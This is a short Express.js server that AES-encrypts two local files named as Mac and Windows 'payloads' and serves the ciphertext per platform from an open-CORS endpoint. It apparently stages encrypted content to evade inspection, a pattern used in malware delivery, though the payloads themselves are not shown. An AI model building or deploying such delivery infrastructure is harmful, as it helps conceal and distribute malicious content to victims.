const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const CryptoJS = require("crypto-js");

const app = express();

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const PASSPHRASE = process.env.PASSPHRASE;

if (!PASSPHRASE) {
  console.error("ERROR: PASSPHRASE environment variable is missing.");
  process.exit(1);
}

// Load payloads
const payloadMacPath = path.join(__dirname, "payload-mac.html");
const payloadWinPath = path.join(__dirname, "payload-win.html");

if (!fs.existsSync(payloadMacPath)) {
  console.error(`ERROR: Missing file: ${payloadMacPath}`);
  process.exit(1);
}

if (!fs.existsSync(payloadWinPath)) {
  console.error(`ERROR: Missing file: ${payloadWinPath}`);
  process.exit(1);
}

const payloadMac = fs.readFileSync(payloadMacPath, "utf8");
const payloadWin = fs.readFileSync(payloadWinPath, "utf8");

// CryptoJS AES encrypt
function encryptWithCryptoJS(content, passphrase) {
  const encrypted = CryptoJS.AES.encrypt(content, passphrase);
  return encrypted.toString();
}

const encryptedMac = encryptWithCryptoJS(payloadMac, PASSPHRASE);
const encryptedWin = encryptWithCryptoJS(payloadWin, PASSPHRASE);

app.get("/data", (req, res) => {
  const platform = req.query.platform || "win";

  const cipher =
    platform === "mac"
      ? encryptedMac
      : encryptedWin;

  res.json({ cipher });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
